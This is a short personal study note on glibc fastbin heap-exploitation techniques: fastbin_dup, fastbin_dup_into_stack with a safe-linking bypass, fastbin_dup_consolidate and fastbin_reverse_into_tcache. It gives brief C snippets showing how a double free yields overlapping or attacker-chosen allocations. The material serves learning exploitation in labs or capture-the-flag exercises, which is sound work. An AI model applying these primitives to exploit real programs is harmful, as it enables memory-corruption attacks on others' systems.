+++
title = "Fastbin_attacks"
date = '2024-05-01'
+++
Fastbins are single linked list. The head is the last freed chunk:

Size of Fastbins: 0x20 - 0x80


## Security Checks
https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks

| Error | Description |
| ----- | ----------- |
| `malloc(): memory corruption (fast)` | While removing the first chunk from fastbin (to service a malloc request), check whether the size of the chunk falls in fast chunk size range | 

## fastbin_dup
Fastbin only checks for double free on top of the freelist. This means the following is possible:

```c
// Filling out tcache
[...]
// Create 2 fastbin chunks; (using calloc to not touch tcache)
void *a = calloc(1, 8);
void *b = calloc(1, 8);
void *c;
free(a);
free(b);
// VULNERABILITY a can be freed again
free(a);

// Now the first and third allocation are the same;
a = calloc(1,8);
b = calloc(1,8);
c = calloc(1,8);

// Overlapping allocation
assert(a == c);
```

## fastbin_dup_into_stack
It's possible to use `fastbin_dup` to get an arbitrary write onto an address. Requirements:
* Arbitrary write into allocated chunks
* target address needs to have a valid *fastbin* size 8 bytes prior
* Leak of the heap address where the target pointer is stored (safelink bypass)
See: [fastbin_dup](fastbin_dup)

Idea is to use the double free to overwrite the next pointer such that `calloc(1,8)` returns an arbitrary pointer.
```
a = calloc(1,8);
*a = (target_pointer-0x10) ^ (a >> 12)
calloc(1,8);
c = calloc(1,8);
assert (c == target_pointer);
```

## fastbin_dup_consolidate
Not very interesting, other than that an allocation of size 0x400 consolidates into a freed `fast_bin`.

## fastbin_reverse_into_tcache
> Writes a large number to target address, requires UAF-write on fastbin_chunk->next
When *tcache* is empty, it tries to get new bins from slower bins like the *fastbin*. 
This exhibits interesting behavior when a *fastbin* next pointer is corrupted:

The exploit goes as follows:
1. Fill Tcache and fastbin with 7 chunks (possible 1 chunk if target_addr points to 0)
2. Empty Tcache 
3. Corrupt Fastbin end of list next pointer with target_addr -0x10
4. `malloc(fastbin_size)`
-> Fastbin list gets reverted in the tcache
-> Write big numbers: `target_addr`-> Heap pointer, `target_addr+8` -> key
5. Optional `malloc(fastbin_size)` -> allocation at target

